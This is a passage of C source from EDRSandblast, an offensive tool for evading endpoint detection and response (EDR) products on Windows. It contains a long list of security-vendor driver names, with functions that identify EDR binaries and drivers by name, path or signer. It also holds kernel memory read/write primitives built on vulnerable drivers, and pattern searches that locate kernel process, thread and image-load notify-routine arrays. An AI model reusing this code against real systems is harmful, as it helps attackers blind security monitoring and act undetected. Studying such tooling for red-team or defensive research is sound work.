   _T("SnDacs.sys"),
   _T("SnExequota.sys"),
   // Infotecs
   _T("filenamevalidator.sys"),
   _T("KC3.sys"),
   // InfoWatch
   _T("iwhlp2.sys"),
   _T("iwhlpxp.sys"),
   _T("iwhlp.sys"),
   _T("iwdmfs.sys"),
   // Initech Inc.
   _T("INISBDrv64.sys"),
   // Int3 Software AB
   _T("equ8_helper.sys"),
   // Intel Corporation
   _T("ielcp.sys"),
   _T("IESlp.sys"),
   _T("IntelCAS.sys"),
   // Intercom Inc.
   _T("tsifilemon.sys"),
   _T("MarSpy.sys"),
   // Interset Inc.
   _T("WDCFilter.sys"),
   // Intronis Inc
   _T("VHDTrack.sys"),
   // Invincea
   _T("InvProtectDrv.sys"),
   _T("InvProtectDrv64.sys"),
   // Ionx Solutions LLP
   _T("AuditFlt.sys"),
   // ioScience
   _T("iothorfs.sys"),
   // iSecure Ltd.
   _T("isecureflt.sys"),
   // ITsMine
   _T("imfilter.sys"),
   // ITSTATION Inc
   _T("aUpDrv.sys"),
   // Ivanti
   _T("IvAppMon.sys"),
   // J's Communication Co.
   _T("RevoNetDriver.sys"),
   // Jinfengshuntai
   _T("IPFilter.sys"),
   // JiranData Co. Ltd
   _T("JDPPWF.sys"),
   _T("JDPPSF.sys"),
   // Jiransoft Co., Ltd
   _T("offsm.sys"),
   _T("xkfsfd.sys"),
   _T("JKPPOB.sys"),
   _T("JKPPXK.sys"),
   _T("JKPPPF.sys"),
   _T("JKPPOK.sys"),
   _T("pcpifd.sys"),
   // k4solution Co.
   _T("zsfprt.sys"),
   // Kalpataru
   _T("GPMiniFIlter.sys"),
   // Kaspersky Lab
   _T("klboot.sys"),
   _T("klfdefsf.sys"),
   _T("klrsps.sys"),
   _T("klsnsr.sys"),
   _T("klifks.sys"),
   _T("klifaa.sys"),
   _T("Klifsm.sys"),
   // KEBA AG
   _T("KeWF.sys"),
   // Kenubi
   _T("boxifier.sys"),
   // Keysight Technologies
   _T("KtFSFilter.sys"),
   // kingsoft
   _T("Kisknl.sys"),
   // Kits Ltd.
   _T("cbfsfilter2017.sys"),
   // KnowledgeTree Inc.
   _T("ktsyncfsflt.sys"),
   // Koby Kahane
   _T("NpEtw.sys"),
   // Ladislav Zezula
   _T("MSpy.sys"),
   // LANDESK Software
   _T("LDSecDrv.sys"),
   // Lenovo Beijing
   _T("slb_guard.sys"),
   _T("lrtp.sys"),
   // LINK co.
   _T("NetAccCtrl.sys"),
   _T("NetAccCtrl64.sys"),
   // Livedrive Internet Ltd
   _T("LivedriveFilter.sys"),
   // Logichron Inc
   _T("CatMF.sys"),
   // LogRhythm Inc.
   _T("LRAgentMF.sys"),
   // Lovelace Network Tech
   _T("MPKernel.sys"),
   // Lumension
   _T("eps.sys"),
   // Magic Softworks, Inc.
   _T("MagicBackupMonitor.sys"),
   // magrasoft Ltd
   _T("zqFilter.sys"),
   // MailRu
   _T("mracdrv.sys"),
   // Malwarebytes
   _T("mbamshuriken.sys"),
   // Man Technology Inc
   _T("bsrfsflt.sys"),
   _T("fsrfilter.sys"),
   _T("vollock.sys"),
   _T("drbdlock.sys"),
   // ManageEngine Zoho
   _T("DFMFilter.sys"),
   _T("DCFAFilter.sys"),
   _T("RMPHVMonitor.sys"),
   _T("FAPMonitor.sys"),
   _T("MEARWFltDriver.sys"),
   // ManTech
   _T("topdogfsfilt.sys"),
   // March Hare Software Ltd
   _T("evscase.sys"),
   _T("inuse.sys"),
   _T("cvsflt.sys"),
   // McAfee
   _T("mfencfilter.sys"),
   // McAfee Inc.
   _T("mfeaskm.sys"),
   // Micro Focus
   _T("FilrDriver.sys"),
   // Microsoft
   _T("DhWatchdog.sys"),
   _T("mssecflt.sys"),
   _T("Backupreader.sys"),
   _T("MsixPackagingToolMonitor.sys"),
   _T("AppVMon.sys"),
   _T("DpmFilter.sys"),
   _T("Procmon11.sys"),
   _T("minispy.sys"),
   _T("fdrtrace.sys"),
   _T("filetrace.sys"),
   _T("uwfreg.sys"),
   _T("uwfs.sys"),
   _T("locksmith.sys"),
   _T("winload.sys"),
   _T("CbSampleDrv.sys"),
   _T("simrep.sys"),
   _T("change.sys"),
   _T("delete_flt.sys"),
   _T("SmbResilFilter.sys"),
   _T("usbtest.sys"),
   _T("NameChanger.sys"),
   _T("failMount.sys"),
   _T("failAttach.sys"),
   _T("stest.sys"),
   _T("cdo.sys"),
   _T("ctx.sys"),
   _T("fmm.sys"),
   _T("cancelSafe.sys"),
   _T("message.sys"),
   _T("passThrough.sys"),
   _T("nullFilter.sys"),
   _T("ntest.sys"),
   _T("iiscache.sys"),
   _T("wrpfv.sys"),
   _T("msnfsflt.sys"),
   // Mobile Content Mgmt
   _T("cbfsfilter2017.sys"),
   // MRY Inc.
   _T("drsfile.sys"),
   // NanJing Geomarking
   _T("MagicProtect.sys"),
   _T("cbfsfilter2017.sys"),
   _T("cbfsfilter2020.sys"),
   // NEC Corporation
   _T("UVMCIFSF.sys"),
   // NEC Soft
   _T("flyfs.sys"),
   _T("serfs.sys"),
   _T("hdrfs.sys"),
   // NEC System Technologies
   _T("IccFilterAudit.sys"),
   // NEC System Technologies,Ltd.
   _T("ICFClientFlt.sys"),
   _T("IccFileIoAd.sys"),
   // Neowiz Corporation
   _T("MWatcher.sys"),
   // NetIQ
   _T("CGWMF.sys"),
   // NetLib
   _T("nlcbhelpx86.sys"),
   _T("nlcbhelpx64.sys"),
   _T("nlcbhelpi64.sys"),
   // NetVision, Inc.
   _T("nvmon.sys"),
   // Network Appliance
   _T("flashaccelfs.sys"),
   _T("changelog.sys"),
   // NetworkProfi Ltd
   _T("laFS.sys"),
   // New Net Technologies Limited
   _T("NNTInfo.sys"),
   // NewSoftwares.net,Inc.
   _T("WinFLAHdrv.sys"),
   _T("WinFLAdrv.sys"),
   _T("WinDBdrv.sys"),
   _T("WinFLdrv.sys"),
   _T("WinFPdrv.sys"),
   // NEXON KOREA
   _T("BlackCat.sys"),
   // NextLabs
   _T("nxrmflt.sys"),
   // Niriva LLC
   _T("VHDDelta.sys"),
   _T("FSTrace.sys"),
   // Nomadesk
   _T("cbfltfs4.sys"),
   // Novell
   _T("zesfsmf.sys"),
   // NTP Software
   _T("ntps_fa.sys"),
   // Nurd Yazilim A.S.
   _T("edrdrv.sys"),
   // NURILAB
   _T("pfracdrv.sys"),
   _T("nrcomgrdki.sys"),
   _T("nrcomgrdka.sys"),
   _T("nrpmonki.sys"),
   _T("nrpmonka.sys"),
   _T("nravwka.sys"),
   _T("bhkavki.sys"),
   _T("bhkavka.sys"),
   _T("docvmonk.sys"),
   _T("docvmonk64.sys"),
   // NVELO Inc.
   _T("SamsungRapidFSFltr.sys"),
   // OCZ Storage
   _T("OczMiniFilter.sys"),
   // OnGuard Systems LLC
   _T("NlxFF.sys"),
   // OpenText Corp
   _T("enmon.sys"),
   // OPSWAT Inc.
   _T("libwamf.sys"),
   // ORANGE WERKS Inc
   _T("wgfile.sys"),
   // PA File Sight
   _T("FileSightMF.sys"),
   // Packeteer
   _T("mblmon.sys"),
   // Palo Alto Networks
   _T("tedrdrv.sys"),
   // PHD Virtual Tech Inc.
   _T("phdcbtdrv.sys"),
   // PJSC KP VTI
   _T("RW7FsFlt.sys"),
   // PolyLogyx LLC
   _T("vast.sys"),
   // Positive Technologies
   _T("mpxmon.sys"),
   // Protected Networks
   _T("minitrc.sys"),
   // Qihoo 360
   _T("360box.sys"),
   // Qingdao Ruanmei Network Technology Co.
   _T("RMDiskMon.sys"),
   _T("diskactmon.sys"),
   // Quality Corporation
   _T("qfmon.sys"),
   // Qualys Inc.
   _T("QMON.sys"),
   _T("qfimdvr.sys"),
   // Quantum Corporation.
   _T("cvofflineFlt32.sys"),
   _T("cvofflineFlt64.sys"),
   // Quest Software
   _T("QFAPFlt.sys"),
   // Quest Software Inc.
   _T("BWFSDrv.sys"),
   _T("CAADFlt.sys"),
   // Quick Heal Technologies Pvt. Ltd.
   _T("sieflt.sys"),
   _T("cssdlp.sys"),
   _T("fam.sys"),
   // Quorum Labs
   _T("qfilter.sys"),
   // Rackware
   _T("rwchangedrv.sys"),
   // Redstor Limited
   _T("RsFlt.sys"),
   // RES Software
   _T("FileGuard.sys"),
   _T("NetGuard.sys"),
   _T("RegGuard.sys"),
   _T("ImgGuard.sys"),
   _T("AppGuard.sys"),
   // Resplendence Software Projects
   _T("mmPsy32.sys"),
   _T("mmPsy64.sys"),
   _T("rrMon32.sys"),
   _T("rrMon64.sys"),
   // rhipe Australia Pty
   _T("SeRdr.sys"),
   // Rubrik Inc
   _T("RubrikFileAudit.sys"),
   _T("FileSystemCBT.sys"),
   // rubysoft
   _T("IronGateFD.sys"),
   // RuiGuard Ltd
   _T("RuiMinispy.sys"),
   _T("RuiFileAccess.sys"),
   _T("RuiEye.sys"),
   _T("RuiMachine.sys"),
   _T("RuiDiskFs.sys"),
   // RUNEXY
   _T("ruaff.sys"),
   _T("mlsaff.sys"),
   // SAFE-Cyberdefense
   _T("SAFE-Agent.sys"),
   // Safend
   _T("Sahara.sys"),
   _T("Santa.sys"),
   // SaferZone Co.
   _T("SZEDRDrv.sys"),
   _T("szardrv.sys"),
   _T("szpcmdrv.sys"),
   _T("szdfmdrv.sys"),
   _T("szdfmdrv_usb.sys"),
   _T("sprtdrv.sys"),
   // Samsung SDS Ltd
   _T("SGResFlt.sys"),
   // SanDisk Inc.
   _T("fiopolicyfilter.sys"),
   // Sandoll Communication
   _T("SfdFilter.sys"),
   // SC ODEKIN SOLUTIONS SRL
   _T("ospmon.sys"),
   // Scalable Software Inc.
   _T("PkgFilter.sys"),
   // ScriptLogic
   _T("FSAFilter.sys"),
   // Secdo
   _T("SecdoDriver.sys"),
   // SecureAxis
   _T("usbl_ifsfltr.sys"),
   // SecureAxis Software
   _T("llfilter.sys"),
   // Secured Globe Inc.
   _T("fltRs329.sys"),
   // SecureLink Inc.
   _T("CBFSFilter2017.sys"),
   // Security Code LLC
   _T("ScAuthFSFlt.sys"),
   _T("ScAuthIoDrv.sys"),
   // SentinelOne
   _T("SentinelMonitor.sys"),
   // Sevtechnotrans
   _T("uamflt.sys"),
   // Shanghai YiCun Network Tech Co. Ltd
   _T("AccessValidator.sys"),
   // SharpCrafters
   _T("psisolator.sys"),
   // SheedSoft Ltd
   _T("SheedSelfProtection.sys"),
   // SheedSoft Ltd.
   _T("arta.sys"),
   // Shenzhen CloudRiver
   _T("CrUnCopy.sys"),
   // SHENZHEN UNNOO Information Techco.
   _T("RyGuard.sys"),
   _T("FileShareMon.sys"),
   _T("ryfilter.sys"),
   // Shenzhen Unnoo LTD
   _T("secufile.sys"),
   _T("XiaobaiFs.sys"),
   _T("XiaobaiFsR.sys"),
   // ShinNihonSystec Co
   _T("sagntflt.sys"),
   // Simopro Technology
   _T("CbFltFs4.sys"),
   // SK Infosec Co
   _T("PLPOffDrv.sys"),
   _T("ISFPDrv.sys"),
   _T("ionmonwdrv.sys"),
   // Sky Co., LTD.
   _T("SkyRGDrv.sys"),
   _T("SkyAMDrv.sys"),
   // Sky Co.,Ltd.
   _T("SkyWPDrv.sys"),
   // SmartFile LLC
   _T("FileHubAgent.sys"),
   // SMTechnology Co.
   _T("storagedrv.sys"),
   // SN Systems Ltd
   _T("cbfilter20.sys"),
   _T("cbfsfilter2017.sys"),
   // SnoopWall LLC
   _T("SWCommFltr.sys"),
   // SODATSW
   _T("sodatpfl.sys"),
   // SODATSW spol. s r.o.
   _T("sodatpfl.sys"),
   _T("fcontrol.sys"),
   // SoftCamp Co.
   _T("scred.sys"),
   // Softnext Technologies
   _T("snimg.sys"),
   // SoftPerfect Research
   _T("fsnk.sys"),
   // Software Pursuits Inc.
   _T("SPIMiniFilter.sys"),
   // Sogou Ltd.
   _T("SCAegis.sys"),
   // Solarwinds LLC
   _T("SWFsFltrv2.sys"),
   _T("SWFsFltr.sys"),
   // Soliton Systems
   _T("it2reg.sys"),
   _T("it2drv.sys"),
   _T("solitkm.sys"),
   // Soliton Systems K.K.
   _T("SDVFilter.sys"),
   // Solusseum Inc
   _T("Sefo.sys"),
   // Soluto LTD
   _T("PDGenFam.sys"),
   // Somma Inc
   _T("MonsterK.sys"),
   // SonicWall Inc
   _T("SFPMonitor.sys"),
   // Sophos
   _T("SophosED.sys"),
   // Sophos Plc
   _T("soidriver.sys"),
   // SoulFrost
   _T("sfac.sys"),
   // SPEKNET EOOD
   _T("Asgard.sys"),
   // Spharsoft Technologies
   _T("SvCBT.sys"),
   // Squadra Technologies
   _T("secRMM.sys"),
   // Stegosystems Inc
   _T("StegoProtect.sys"),
   // StorageCraft Tech
   _T("stcvsm.sys"),
   // Stormshield
   _T("EsProbe.sys"),
   // Sumitomo Electric Ltd.
   _T("MCFileMon64.sys"),
   _T("MCFileMon32.sys"),
   // Sun&Moon Rise
   _T("ntfsf.sys"),
   // Symantec
   _T("pgpwdefs.sys"),
   _T("GEProtection.sys"),
   _T("sysMon.sys"),
   _T("ssrfsf.sys"),
   _T("emxdrv2.sys"),
   _T("reghook.sys"),
   _T("spbbcdrv.sys"),
   _T("bhdrvx86.sys"),
   _T("bhdrvx64.sys"),
   _T("SISIPSFileFilter"),
   _T("symevent.sys"),
   // Symantec Corp.
   _T("diflt.sys"),
   // Syncopate
   _T("thetta.sys"),
   // Systemneeds, Inc
   _T("Snilog.sys"),
   // TaaSera Inc.
   _T("AwareCore.sys"),
   // Tanium
   _T("TaniumRecorderDrv.sys"),
   // TCXA Ltd.
   _T("fcnotify.sys"),
   // Tech Research
   _T("FASDriver"),
   // TechnoKom Ltd.
   _T("agfsmon.sys"),
   // Telefnica Digital
   _T("path8flt.sys"),
   // Temasoft S.R.L.
   _T("filemon.sys"),
   // Tencent (Shenzhen)
   _T("QQProtect.sys"),
   _T("QQProtectX64.sys"),
   // Tencent Technology
   _T("TenRSafe2.sys"),
   _T("tesxporter.sys"),
   _T("tesxnginx.sys"),
   // Tetraglyph Technologies
   _T("TGFSMF.sys"),
   // ThinAir Labs Inc
   _T("taobserveflt.sys"),
   // ThinScale Tech
   _T("TSTFsReDir.sys"),
   _T("TSTRegReDir.sys"),
   _T("TSTFilter.sys"),
   // Third Brigade
   _T("tbfsfilt.sys"),
   // Threat Stack
   _T("ThreatStackFIM.sys"),
   // Tiversa Inc
   _T("tss.sys"),
   // Topology Ltd
   _T("dsfemon.sys"),
   // Tranxition Corp
   _T("regmonex.sys"),
   _T("TXRegMon.sys"),
   // Trend Micro Inc.
   _T("TMUMS.sys"),
   _T("hfileflt.sys"),
   _T("TMUMH.sys"),
   // Trend Micro, Inc.
   _T("AcDriver.sys"),
   _T("SakFile.sys"),
   _T("SakMFile.sys"),
   // Tritium Inc.
   _T("Tritiumfltr.sys"),
   // Trustware Ltd
   _T("Redlight.sys"),
   // Trustwave
   _T("TWBDCFilter.sys"),
   // UpGuard
   _T("UpGuardRealTime.sys"),
   // Varlook Ltd.
   _T("varpffmon.sys"),
   // Varonis Ltd
   _T("VrnsFilter.sys"),
   // Veramine Inc
   _T("phantomd.sys"),
   // Vidder Inc.
   _T("vidderfs.sys"),
   // Viewfinity
   _T("vfdrv.sys"),
   // Vision Solutions
   _T("repdrv.sys"),
   _T("repmon.sys"),
   // VMware, Inc.
   _T("VMWVvpfsd.sys"),
   _T("RTOLogon.sys"),
   // VoodooSoft
   _T("VSScanner.sys"),
   // WaikatoLink Ltd
   _T("proggerdriver.sys"),
   // WardWiz
   _T("WRDWIZFILEPROT.SYS"),
   _T("WRDWIZREGPROT.SYS"),
   // Warp Disk Software
   _T("DsDriver.sys"),
   // Weing Co.,Ltd.
   _T("pscff.sys"),
   // Wellbia.com
   _T("xhunter64.sys"),
   _T("uncheater.sys"),
   // Wellbiacom
   _T("xhunter1.sys"),
   // Whitebox Security
   _T("wbfilter.sys"),
   // WhiteCell Software Inc.
   _T("EGMinFlt.sys"),
   // WidgetNuri Corp
   _T("wsafefilter.sys"),
   _T("RansomDetect.sys"),
   // Winicssec Ltd
   _T("wlminisecmod.sys"),
   _T("WntGPDrv.sys"),
   // X-Cloud Systems
   _T("xcpl.sys"),
   // Xacti
   _T("stflt.sys"),
   // Yahoo Japan Corporation
   _T("YahooStorage.sys"),
   // Yandex LLC
   _T("bmregdrv.sys"),
   _T("bmfsdrv.sys"),
   // YATEM Co. Ltd.
   _T("LCmPrintMon.sys"),
   _T("LCgAdMon.sys"),
   _T("LCmAdMon.sys"),
   _T("LCgFileMon.sys"),
   _T("LCmFile.sys"),
   _T("LCgFile.sys"),
   _T("LCmFileMon.sys"),
   // Yokogawa Corpration
   _T("YFSD2.sys"),
   // Yokogawa R&L Corp
   _T("YFSDR.SYS"),
   _T("YFSD.SYS"),
   _T("YFSRD.sys"),
   _T("psgfoctrl.sys"),
   _T("psgdflt.sys"),
   // Zampit
   _T("zampit_ml.sys"),
   // ZenmuTech Inc.
   _T("mumdi.sys"),
   // Zhuan Zhuan Jing Shen
   _T("zzpensys.sys"),
   // ZoneFox
   _T("KernelAgent32.sys"),
   /*
   * FSFilter Activity Monitor - END
   */
   /*
   * Invoke-EDRCheck.ps1 - BEGIN
   * Duplicates from previous source are removed.
   */
   // Altiris Symantec
   _T("atrsdfw.sys"),
   // Avast
   _T("naswSP.sys"),
   // Carbon Black
   _T("CbELAM.sys"),
   _T("ctifile.sys"),
   _T("ctinet.sys"),
   _T("parity.sys"),
   // Cisco
   _T("csacentr.sys"),
   _T("csaenh.sys"),
   _T("csareg.sys"),
   _T("csascr.sys"),
   // CJSC Returnil Software
   _T("rvsavd.sys"),
   // Comodo Security
   _T("CmdMnEfs.sys"),
   _T("MyDLPMF.sys"),
   // CrowdStrike
   _T("im.sys"),
   _T("CSDeviceControl.sys"),
   _T("CSFirmwareAnalysis.sys"),
   // Cybereason
   _T("CRExecPrev.sys"),
   // Endgame
   _T("esensor.sys"),
   // ESET
   _T("edevmon.sys"),
   // F-Secure
   _T("xfsgk.sys"),
   // Malwarebytes
   _T("mbamwatchdog.sys"),
   // Microsoft Defender
   _T("MpKslDrv.sys"),
   // Palo Alto Networks - Cortex XDR
   _T("cyverak.sys"),
   _T("cyvrlpc.sys"),
   _T("cyvrmtgn.sys"),
   _T("tdevflt.sys"),
   // Raytheon Cyber Solutions
   _T("eaw.sys"),
   // Symantec
   _T("vxfsrep.sys"),
   _T("VirtFile.sys"),
   _T("SymAFR.sys"),
   _T("symefasi.sys"),
   _T("symefa.sys"),
   _T("symefa64.sys"),
   _T("SymHsm.sys"),
   _T("evmf.sys"),
   _T("GEFCMP.sys"),
   _T("VFSEnc.sys"),
   _T("pgpfs.sys"),
   _T("fencry.sys"),
   _T("symrg.sys"),
   // Verdasys Inc
   _T("ndgdmk.sys"),
   /*
   * Invoke-EDRCheck.ps1 - END
   */

   /*
   * User contributions
   */
   // Tehtris
   _T("egfilterk.sys"),
   // Sophos
   _T("SophosDt2.sys"),
   _T("SophosSupport.sys"),
   // Cisco AMP
   _T("ExPrevDriver.sys"),
};

BOOL isFileSignatureMatchingEDR(TCHAR* filePath) {
    SignatureOpsError returnValue;
    TCHAR* signers = NULL;
    size_t szSigners = 0;
    returnValue = GetFileSigners(filePath, signers, &szSigners);

    // Expected if the file is signed, first call will return the needed buffer size.
    if (returnValue == E_INSUFFICIENT_BUFFER) {
        signers = calloc(szSigners, sizeof(TCHAR));
        if (!signers) {
            _tprintf_or_not(TEXT("[!] Couldn't allocate memory for Signers information for binary \"%s\"\n"), filePath);
            return FALSE;
        }
        returnValue = GetFileSigners(filePath, signers, &szSigners);
    }

    // If the file is not signed, it's unlikely to be linked to an EDR product.
    if (returnValue == E_NOT_SIGNED) {
        // _tprintf_or_not(TEXT("[*] File \"%s\" is not signed.\n"), binaryPath);
        return FALSE;
    }

    if (returnValue == E_FILE_NOT_FOUND) {
        _tprintf_or_not(TEXT("[!] Couldn't locate file \"%s\" to retrieve certificate information.\n"), filePath);
        return FALSE;
    }

    if ((returnValue != E_SUCCESS) || !signers) {
        _tprintf_or_not(TEXT("[!] An error occurred while retrieving certificate information for file \"%s\"\n"), filePath);
        return FALSE;
    }

    // Iterates over each keywords in EDR_SIGNATURE_KEYWORDS and return TRUE if a match is found.
    for (int i = 0; i < _countof(EDR_SIGNATURE_KEYWORDS); ++i) {
        if (_tcsstr(signers, EDR_SIGNATURE_KEYWORDS[i])) {
            free(signers);
            return TRUE;
        }
    }

    free(signers);
    return FALSE;
}

BOOL isBinaryNameMatchingEDR(TCHAR* binaryName) {
    for (int i = 0; i < _countof(EDR_BINARIES); ++i) {
        if (_tcscmp(binaryName, EDR_BINARIES[i]) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

BOOL isBinaryPathMatchingEDR(TCHAR* binaryPath) {
    for (int i = 0; i < _countof(EDR_BINARIES); ++i) {
        if (_tcsstr(binaryPath, EDR_BINARIES[i])) {
            return TRUE;
        }
    }
    return FALSE;
}

BOOL isDriverNameMatchingEDR(TCHAR* driverName) {
    for (int i = 0; i < _countof(EDR_DRIVERS); ++i) {
        if (_tcscmp(driverName, EDR_DRIVERS[i]) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

BOOL isDriverPathMatchingEDR(TCHAR* driverPath) {
    for (int i = 0; i < _countof(EDR_DRIVERS); ++i) {
        if (_tcsstr(driverPath, EDR_DRIVERS[i])) {
            return TRUE;
        }
    }
    return FALSE;
}

// TODO : create an API to check, with only the name of a loaded driver, if it an EDR (check its name against the hardcoded list of names, automatically find its path on disk and check the file signature)
```

`EDRSandblast/Utils/IsElevatedProcess.c`:

```c
#include "IsElevatedProcess.h"

BOOL IsElevatedProcess() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}

	if (hToken) {
		CloseHandle(hToken);
	}

	return fRet;
}
```

`EDRSandblast/Utils/KernelMemoryPrimitives.c`:

```c
#include <Windows.h>
#include <Tchar.h>
#include <stdio.h>
#include <assert.h>

#include "DriverRTCore.h"
#include "DriverDBUtil.h"
#include "KernelUtils.h"
#include "../EDRSandblast.h"

#include "KernelMemoryPrimitives.h"

VOID ReadMemory(DWORD64 Address, PVOID Buffer, SIZE_T Size) {
    ReadMemoryPrimitive(Size, Address, Buffer);
}

VOID WriteMemory(DWORD64 Address, PVOID Buffer, SIZE_T Size) {
    WriteMemoryPrimitive(Size, Address, Buffer);
}

#define ReadMemoryType(TYPE) \
TYPE ReadMemory ## TYPE ## (DWORD64 Address) {\
    TYPE res;\
    ReadMemoryPrimitive(sizeof(TYPE), Address, &res);\
    return res;\
}
ReadMemoryType(BYTE);
ReadMemoryType(WORD);
ReadMemoryType(DWORD);
ReadMemoryType(DWORD64);

#define ReadKernelMemoryType(TYPE) \
TYPE ReadKernelMemory ## TYPE ## (DWORD64 Offset) {\
    TYPE res;\
    DWORD64 Address = FindNtoskrnlBaseAddress() + Offset;\
    ReadMemoryPrimitive(sizeof(TYPE), Address, &res);\
    return res;\
}

ReadKernelMemoryType(BYTE);
ReadKernelMemoryType(WORD);
ReadKernelMemoryType(DWORD);
ReadKernelMemoryType(DWORD64);

#define WriteMemoryType(TYPE) \
VOID WriteMemory ## TYPE ## (DWORD64 Address, TYPE Value) {\
    WriteMemoryPrimitive(sizeof(TYPE), Address, &Value);\
}

WriteMemoryType(BYTE);
WriteMemoryType(WORD);
WriteMemoryType(DWORD);
WriteMemoryType(DWORD64);


#define WriteKernelMemoryType(TYPE) \
VOID WriteKernelMemory ## TYPE ## (DWORD64 Offset, TYPE Value) {\
    DWORD64 Address = FindNtoskrnlBaseAddress() + Offset;\
    WriteMemoryPrimitive(sizeof(TYPE), Address, &Value);\
}

WriteKernelMemoryType(BYTE);
WriteKernelMemoryType(WORD);
WriteKernelMemoryType(DWORD);
WriteKernelMemoryType(DWORD64);

BOOL TestReadPrimitive() {
    return ReadKernelMemoryWORD(0) == *(WORD*)"MZ";
}

```

`EDRSandblast/Utils/KernelPatternSearch.c`:

```c
/*

--- ntoskrnl Notify Routines' offsets search functions using patterns.
--- Ultimately not used because too unreliable and too prone to BSoD.

*/
#include <Windows.h>
#include <Tchar.h>
#include "KernelMemoryPrimitives.h"
#include "KernelUtils.h"
#include "../EDRSandblast.h"

DWORD64 PatternSearchStartingFromAddress(DWORD64 startAddress, DWORD bytesToScan, DWORD64 pattern, DWORD64 mask) {
    for (DWORD i = 0; i < bytesToScan; i++) {
        DWORD64 instructionAddress = startAddress + i;
        DWORD64 dword64Instruction = ReadMemoryDWORD64(instructionAddress);
        DWORD64 dword64InstructionFixed = dword64Instruction & mask;
        // _tprintf_or_not(TEXT("i = %i, pattern = 0x%I64x, instructionAddress = 0x%I64x, wordInstruction = 0x%I64x, wordInstructionFixed = 0x%I64x\n"), i, pattern, instructionAddress, dword64Instruction, dword64InstructionFixed);
        if (dword64InstructionFixed == pattern) {
            _tprintf_or_not(TEXT("[+] Found pattern = 0x%I64x at offset i = %i [instructionAddress = 0x%I64x, wordInstruction = 0x%I64x, wordInstructionFixed = 0x%I64x]\n"), pattern, i, instructionAddress, dword64Instruction, dword64InstructionFixed);
            return instructionAddress;
        }
    }
    return 0x0;
}

DWORD64 ExtractRelativeAddress(DWORD64 instructionStartAddress, DWORD64 instructionRelativeAddressOffset, DWORD64 nextInstructionOffset) {
    DWORD64 procedureRelativeAddress = (signed int)ReadMemoryDWORD64(instructionStartAddress + instructionRelativeAddressOffset);
    DWORD64 nextInstructionAddress = instructionStartAddress + nextInstructionOffset;
    return nextInstructionAddress + procedureRelativeAddress;
}

DWORD64 GetPspCreateProcessNotifyRoutineAddressUsingPattern(void) {
    _putts_or_not(TEXT("[*] Searching for PspCreateProcessNotifyRoutine address using pattern"));

    // Extracting PspSetCreateProcessNotifyRoutine address in PsSetCreateProcessNotifyRoutine using the pattern "E8" (CALL) to match "[e80e010000]  call nt!PspSetCreateProcessNotifyRoutine".
    DWORD64 PsSetCreateProcessNotifyRoutineAddress = GetKernelFunctionAddress("PsSetCreateProcessNotifyRoutine");
    DWORD64 CallPspSetCreateProcessNotifyRoutineAddress = PatternSearchStartingFromAddress(PsSetCreateProcessNotifyRoutineAddress, 64, 0x00000000000000E8, 0x00000000000000FF);
    DWORD64 PspSetCreateProcessNotifyRoutineAddress = ExtractRelativeAddress(CallPspSetCreateProcessNotifyRoutineAddress, 1, 5);

    // Extracting PspCreateProcessNotifyRoutine address in PspSetCreateProcessNotifyRoutine using the pattern "4C 8D" (LEA 4C) to match "[4c8d2d371ddaff]  lea r13,[nt!PspCreateProcessNotifyRoutine".
    DWORD64 LeaPspCreateProcessNotifyRoutineAddress = PatternSearchStartingFromAddress(PspSetCreateProcessNotifyRoutineAddress, 256, 0x0000000000008D48, 0x000000000000FFF8);
    DWORD64 PspCreateProcessNotifyRoutineAddress = ExtractRelativeAddress(LeaPspCreateProcessNotifyRoutineAddress, 3, 7);
    _tprintf_or_not(TEXT("[+] Pattern search found PspCreateProcessNotifyRoutine address: 0x%I64x\n"), PspCreateProcessNotifyRoutineAddress);
    
    return PspCreateProcessNotifyRoutineAddress;
}

DWORD64 GetPspCreateThreadNotifyRoutineAddressUsingPattern(void) {
    _putts_or_not(TEXT("[*] Searching for PspCreateThreadNotifyRoutine address using pattern"));

    // Extracting nt!PspSetCreateThreadNotifyRoutine address in nt!PsSetCreateThreadNotifyRoutine using the pattern "E8" (CALL) to match "[e865000000]  call nt!PspSetCreateThreadNotifyRoutine".
    DWORD64 PsSetCreateThreadNotifyRoutineAddress = GetKernelFunctionAddress("PsSetCreateThreadNotifyRoutine");
    DWORD64 CallPspSetCreateThreadNotifyRoutineAddress = PatternSearchStartingFromAddress(PsSetCreateThreadNotifyRoutineAddress, 64, 0x00000000000000E8, 0x00000000000000FF);
    DWORD64 PspSetCreateThreadNotifyRoutineAddress = ExtractRelativeAddress(CallPspSetCreateThreadNotifyRoutineAddress, 1, 5);

    // Extracting nt!PspCreateThreadNotifyRoutine address in nt!PspSetCreateThreadNotifyRoutine using the pattern "4C 8D" (LEA 4C) to match "[488d0d431cdaff]  lea rcx,[nt!PspCreateThreadNotifyRoutine]".
    DWORD64 LeaPspCreateThreadNotifyRoutineAddress = PatternSearchStartingFromAddress(PspSetCreateThreadNotifyRoutineAddress, 256, 0x0000000000008D48, 0x000000000000FFF8);
    DWORD64 PspCreateThreadNotifyRoutineAddress = ExtractRelativeAddress(LeaPspCreateThreadNotifyRoutineAddress, 3, 7);
    _tprintf_or_not(TEXT("[+] Pattern search found PspCreateThreadNotifyRoutine address: 0x%I64x\n"), PspCreateThreadNotifyRoutineAddress);
    
    return PspCreateThreadNotifyRoutineAddress;
}

DWORD64 GetPspLoadImageNotifyRoutineAddressUsingPattern(void) {
    _putts_or_not(TEXT("[*] Searching for PspLoadImageNotifyRoutine address using pattern"));

    // Extracting nt!PspLoadImageNotifyRoutine address directly from nt!PsSetLoadImageNotifyRoutineEx using the pattern "4C 8D" (LEA 4C) to match "[488d0d981ddaff]  lea rcx,[nt!PspLoadImageNotifyRoutine]".
    DWORD64 PsSetLoadImageNotifyRoutineExAddress = GetKernelFunctionAddress("PsSetLoadImageNotifyRoutineEx");
    DWORD64 LeaPspLoadImageNotifyRoutineAddress = PatternSearchStartingFromAddress(PsSetLoadImageNotifyRoutineExAddress, 128, 0x0000000000008D48, 0x000000000000FFF8);
    DWORD64 PspLoadImageNotifyRoutineAddress = ExtractRelativeAddress(LeaPspLoadImageNotifyRoutineAddress, 3, 7);;
